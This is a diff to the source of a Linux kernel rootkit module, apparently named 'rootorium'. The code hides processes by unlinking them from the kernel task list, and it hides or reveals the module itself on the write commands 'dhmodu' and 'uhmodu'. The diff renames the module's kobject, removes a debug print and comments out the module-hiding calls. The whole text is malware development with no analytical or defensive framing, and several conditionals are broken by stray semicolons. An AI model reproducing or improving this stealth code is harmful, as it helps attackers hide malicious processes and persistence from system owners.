@@ -123,7 +123,7 @@ static void module_show(void)
 
     list_add(&THIS_MODULE->list, module_previous);
     if(kobject_add(&THIS_MODULE->mkobj.kobj,
-        THIS_MODULE->mkobj.kobj.parent, "rk"));
+        THIS_MODULE->mkobj.kobj.parent, "rootorium"));
     hide_module = !hide_module;
 }
 
@@ -184,7 +184,6 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
                 if(kstrtol(pid_s, 10, &pid));
                 if(pid == p->pid)
                 {
-                    printk("----------%ld: %s\n", pid, p->comm);
                     proc_to_hide[current_pid] = p;
                     //list_del(&p->tasks);
                     p->tasks.prev->next = p->tasks.next;
@@ -208,11 +207,13 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
     }
     else if(!strncmp(buffer, "dhmodu", MIN(6, count)))
     {
-        module_hide();
+        //TODO: Fix module_hide
+        //module_hide();
     }
     else if(!strncmp(buffer, "uhmodu", MIN(6, count)))
     {
-        module_show();
+        //TODO: Fix module_show
+        //module_show();
     }
 
     return count;
